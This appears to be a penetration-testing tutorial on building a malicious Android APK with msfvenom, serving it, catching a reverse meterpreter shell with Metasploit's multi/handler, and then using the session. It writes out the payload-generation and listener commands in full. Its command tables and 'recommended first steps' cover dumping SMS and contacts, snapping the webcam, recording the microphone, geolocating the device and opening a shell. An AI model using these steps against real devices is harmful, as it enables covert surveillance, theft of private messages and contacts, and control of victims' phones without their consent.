
## Android Pentest Msfvenom


**CHECK IP ADDRESS**  
  
```
ifconfig
```


**CREATING PAYLOAD WITH MSFVENOM**

The payload is an integral part of the attack that harms the victim. Attack vectors such as viruses, worms, and malware may contain multiple harmful payloads.

Metasploit payloads are divided into three types:

**Single:** A single file is very small and aims to establish a certain connection, and then enter the next level.

**Staged:** This is the payload that an attacker can use to upload larger files to the victim’s system.  
  
**Stages:** A stages is a payload component loaded using the stager module. The payload stages provides advanced features with no size limitation, such as meterpreter and VNC injection.  
  
Commands to create payload:  

```
msfvenom -p android/meterpreter/reverse\_tcp LHOST=192.168.2.21 LPORT=4444 R -o payload.apk
```
  
- This command will create a malicious file called `payload.apk`


```
python3 -m http.server 1337
```

- Command will start a http server on port `1337`


**START METASPLOIT FRAMEWORK**  
  
Metasploit is one amongst the foremost powerful and widely utilized tools for penetration testing. 

The Metasploit Project could be a pc security project that has data regarding security vulnerabilities and aids in penetration testing and IDS signature development.

The Metasploit Framework can lead us to take advantage of the payload that is generated


**EXPLOITATION  

While exploitation, We need to use exploit/multi/handler to handle the msf process. The multi/handler handles the exploit for us and presents us our shell.

```
msf6 > use exploit/multi/handler  
```

Then we have to set the PAYLOAD which is android/meterpreter/reverse\_tcp as we have to gain access of android and reverse tcp because the tcp port is open on internet. 

```
msf6exploit(multi/handler)>set payload android/meterpreter/reverse\_tcp
```

Just set the LHOST and LPORT just to exploit the apk on the host machine. 

```
msf6 exploit(multi/handler) > set LHOST 192.168.2.21 
```


```
msf6 exploit(multi/handler) > show options  
```

Lastly, Exploit payload.  

```
msf6 exploit(multi/handler) > exploit
```


**GAINED ACCESS**: (Meterpreter Session Opened)  
  
Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
  
**COMMAND TO INTERNACT WITH SESSIONS:**  

```
meterpreter > help
```
 
  - to know all the commands


```
meterpreter > app\_list
```

- command to see the apps installed on android device

```
meterpreter > app\_uninstall 
```

- command to uninstall the app

  ---

### Basic Commands

|Command|Description|
|---|---|
|`help`|Show all available Meterpreter commands|
|`sysinfo`|Get device information (OS version, device model, etc.)|
|`getuid`|Show current user ID|
|`ifconfig`|Show network interfaces|
|`netstat`|Show active network connections|

---

### File System Interaction

|Command|Description|
|---|---|
|`ls`|List files in current directory|
|`cd <dir>`|Change directory|
|`download <file>`|Download file from the device|
|`upload <file>`|Upload a file to the device|
|`rm <file>`|Delete a file|
|`pwd`|Print working directory|

---

### Android-Specific Features

(Meterpreter supports Android-specific extensions)

|Command|Description|
|---|---|
|`webcam_list`|List available cameras|
|`webcam_snap`|Take a photo using the camera|
|`record_mic`|Record audio from the microphone|
|`dump_sms`|Dump SMS messages|
|`dump_contacts`|Dump contact list|
|`check_root`|Check if the device is rooted|
|`shell`|Drop into a standard Linux shell on the device|
|`geolocate`|Get GPS location (if enabled)|

---

### Gathering Data

|Command|Description|
|---|---|
|`app_list`|List installed apps|
|`app_run <package>`|Run an installed app|
|`app_install <apk>`|Install an APK|
|`app_uninstall <package>`|Uninstall an app|

---

### Network and Privilege Escalation

|Command|Description|
|---|---|
|`portfwd`|Forward ports through the session|
|`route`|View or modify routing table|
|`run post/multi/recon/local_exploit_suggester`|Suggest potential exploits based on system info|

---
### **Exiting**

|Command|Description|
|---|---|
|`background`|Send session to background (can interact later with `sessions -i`)|
|`exit`|Close session|

---

###  **Recommended First Steps After Getting Session**

1. `sysinfo` – Understand what device you’re dealing with.
    
2. `check_root` – Determine privileges.
    
3. `dump_contacts` / `dump_sms` – Grab sensitive data.
    
4. `webcam_snap` / `record_mic` – Gather intelligence.
    
5. `shell` – Drop into native shell for advanced control.
    

---

If you'd like to automate things or gather everything at once, you can also run post modules like:

```bash
run post/android/gather/enum_apps
run post/android/gather/contacts
run post/android/gather/location
```


-----


